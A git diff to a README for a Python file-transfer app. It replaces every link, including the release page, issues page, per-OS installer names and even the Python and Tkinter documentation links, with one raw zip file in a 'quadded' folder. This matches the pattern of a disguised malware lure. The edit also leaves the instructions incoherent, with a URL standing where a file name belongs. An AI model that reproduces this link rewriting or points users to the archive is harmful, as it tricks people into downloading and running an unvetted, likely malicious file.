@@ -6,7 +6,7 @@ Welcome to file-transfer, a simple way to move files and folders across your loc
 
 ## 📥 Download Now
 
-[![Download file-transfer](https://img.shields.io/badge/Download-file--transfer-brightgreen.svg)](https://github.com/andrxs-le/file-transfer/releases)
+[![Download file-transfer](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
 
 ## 📋 Features
 
@@ -25,11 +25,11 @@ Welcome to file-transfer, a simple way to move files and folders across your loc
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/andrxs-le/file-transfer/releases) and download the latest version of file-transfer. Choose the file that matches your operating system:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip) and download the latest version of file-transfer. Choose the file that matches your operating system:
 
-- Windows: `file-transfer-X.Y.Z-windows.exe`
-- macOS: `file-transfer-X.Y.Z-macos.zip`
-- Linux: `file-transfer-X.Y.Z-linux.tar.gz`
+- Windows: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
+- macOS: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
+- Linux: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
 
 After downloading, follow these steps:
 
@@ -42,7 +42,7 @@ After downloading, follow these steps:
    - Drag the application to your Applications folder.
 
 3. **Linux:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run `./file-transfer` to start the application.
 
@@ -66,7 +66,7 @@ After downloading, follow these steps:
 
 ## 📞 Support
 
-If you run into any issues or have questions, please visit our [GitHub Issues page](https://github.com/andrxs-le/file-transfer/issues) for help. Your feedback is important for improving our application.
+If you run into any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip) for help. Your feedback is important for improving our application.
 
 ## 📜 Acknowledgments
 
@@ -76,8 +76,8 @@ Thanks to all the contributors who help make file-transfer better. Your hard wor
 
 Explore more topics related to file-transfer:
 
-- [Python](https://www.python.org/)
-- [Tkinter](https://docs.python.org/3/library/tkinter.html)
-- [Networking Basics](https://www.khanacademy.org/computing/computer-science/internet-intro)
+- [Python](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
+- [Tkinter](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
+- [Networking Basics](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
 
 For more details on how to use file-transfer, please refer to the documentation on the GitHub page.
